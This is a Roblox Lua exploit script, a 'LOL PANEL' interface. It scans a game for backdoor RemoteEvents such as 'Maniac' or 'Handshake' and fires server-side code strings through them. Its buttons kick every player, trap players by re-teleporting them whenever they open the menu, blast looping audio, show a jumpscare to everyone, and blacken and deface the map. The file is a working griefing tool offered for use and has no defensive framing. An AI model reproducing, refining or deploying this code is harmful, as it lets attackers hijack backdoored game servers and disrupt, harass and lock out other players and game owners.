local Players = game:GetService("Players")
local GuiService = game:GetService("GuiService")
local TeleportService = game:GetService("TeleportService")
local SoundService = game:GetService("SoundService")

-- Asset Configuration
local userId = 5151296954 
local avatarImg = "rbxthumb://type=Avatar&id="..userId.."&w=420&h=420"
local musicID = "rbxassetid://137940368194253"
local jumpSoundID = "rbxassetid://126272434832719"

local FoundRemote = nil
local player = Players.LocalPlayer
local pGui = player:WaitForChild("PlayerGui")

-- UI Setup
local ScreenGui = Instance.new("ScreenGui", pGui)
ScreenGui.Name = "LoLPanel"
ScreenGui.ResetOnSpawn = false

-- 1. Injector Status
local LoadFrame = Instance.new("Frame", ScreenGui)
LoadFrame.Size = UDim2.new(0, 220, 0, 90)
LoadFrame.Position = UDim2.new(0.5, -110, 0.5, -45)
LoadFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 40)

local Status = Instance.new("TextLabel", LoadFrame)
Status.Size = UDim2.new(1, 0, 1, 0)
Status.Text = "Scanning Backdoor..."
Status.TextColor3 = Color3.new(1, 1, 1)
Status.BackgroundTransparency = 1

task.wait(1)
for _, v in pairs(game:GetDescendants()) do
    if v:IsA("RemoteEvent") and (v.Name == "Maniac" or v.Name == "Handshake" or v.Name == "RemoteEvent") then
        FoundRemote = v
        break
    end
end
Status.Text = FoundRemote and "Backdoor Found!" or "Not Found!"
task.wait(1)
LoadFrame:Destroy()

-- 2. Main Panel
local Main = Instance.new("Frame", ScreenGui)
Main.BackgroundColor3 = Color3.fromRGB(0, 0, 45)
Main.Position = UDim2.new(0.05, 0, 0.3, 0)
Main.Size = UDim2.new(0, 220, 0, 320)
Main.Active = true
Main.Draggable = true

local Title = Instance.new("TextLabel", Main)
Title.Size = UDim2.new(1, 0, 0, 35)
Title.Text = "LOL PANEL"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.BackgroundColor3 = Color3.fromRGB(100, 0, 0)

local Scroll = Instance.new("ScrollingFrame", Main)
Scroll.Size = UDim2.new(1, 0, 1, -35)
Scroll.Position = UDim2.new(0, 0, 0, 35)
Scroll.BackgroundTransparency = 1
Scroll.CanvasSize = UDim2.new(0, 0, 4, 0) -- Saiz sangat panjang supaya semua butang muat
Scroll.ScrollBarThickness = 6

local UIList = Instance.new("UIListLayout", Scroll)
UIList.Padding = UDim.new(0, 5)
UIList.HorizontalAlignment = Enum.HorizontalAlignment.Center

local function createBtn(txt, col, cb)
    local b = Instance.new("TextButton", Scroll)
    b.Size = UDim2.new(0.9, 0, 0, 35)
    b.BackgroundColor3 = col or Color3.fromRGB(0, 0, 120)
    b.Text = txt
    b.TextColor3 = Color3.new(1, 1, 1)
    b.Font = Enum.Font.SourceSansBold
    b.MouseButton1Click:Connect(cb)
end

-- --- SUSUNAN BUTANG (Pastikan Scroll ke bawah) ---

createBtn("SHUTDOWN SERVER", Color3.fromRGB(255, 0, 0), function()
    local sd = "for _,p in pairs(game.Players:GetPlayers()) do p:Kick('Server Shutdown') end"
    if FoundRemote then FoundRemote:FireServer(sd) end
end)

createBtn("ACTIVATE PRISON", Color3.fromRGB(150, 0, 0), function()
    local trap = [[
        game:GetService("GuiService").MenuOpened:Connect(function()
            game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
        end)
    ]]
    if FoundRemote then FoundRemote:FireServer(trap) end
end)

createBtn("PLAY SOUND", Color3.fromRGB(0, 150, 0), function()
    local sc = "local s = Instance.new('Sound', game.SoundService); s.SoundId = '"..musicID.."'; s.Volume = 10; s.Looped = true; s:Play()"
    if FoundRemote then FoundRemote:FireServer(sc) end
end)

createBtn("JUMPSCARE ALL", Color3.fromRGB(180, 0, 180), function()
    local jc = [[for _,p in pairs(game.Players:GetPlayers()) do local j = Instance.new("ScreenGui", p.PlayerGui); local f = Instance.new("Frame", j); f.Size = UDim2.new(1,0,1,0); f.BackgroundColor3 = Color3.fromRGB(200,200,200); local i = Instance.new("ImageLabel", f); i.Size = UDim2.new(0.5,0,0.5,0); i.Position = UDim2.new(0.25,0,0.25,0); i.Image = "]]..avatarImg..[["; local s = Instance.new("Sound", p.PlayerGui); s.SoundId = "]]..jumpSoundID..[["; s.Volume = 10; s:Play(); task.delay(10, function() j:Destroy() end) end]]
    if FoundRemote then FoundRemote:FireServer(jc) end
end)

createBtn("PARTICLE ALL", Color3.fromRGB(0, 100, 200), function()
    local pc = "for _,p in pairs(game.Players:GetPlayers()) do if p.Character then local pe = Instance.new('ParticleEmitter', p.Character.PrimaryPart); pe.Texture = '"..avatarImg.."'; pe.Size = NumberSequence.new(5) end end"
    if FoundRemote then FoundRemote:FireServer(pc) end
end)

createBtn("INFECT SERVER", Color3.fromRGB(50, 50, 50), function()
    local inf = [[game.Lighting.ClockTime = 0; for _,o in pairs(workspace:GetDescendants()) do if o:IsA("BasePart") then o.Color = Color3.new(0,0,0); local d = Instance.new("Decal", o); d.Texture = "]]..avatarImg..[["; d.Face = "Top" end end]]
    if FoundRemote then FoundRemote:FireServer(inf) end
end)

createBtn("KICK ALL", Color3.fromRGB(150, 0, 0), function()
    local k = "for _,p in pairs(game.Players:GetPlayers()) do if p.Name ~= '"..player.Name.."' then p:Kick('Kick By KHAFIDZKTP') end end"
    if FoundRemote then FoundRemote:FireServer(k) end
end)

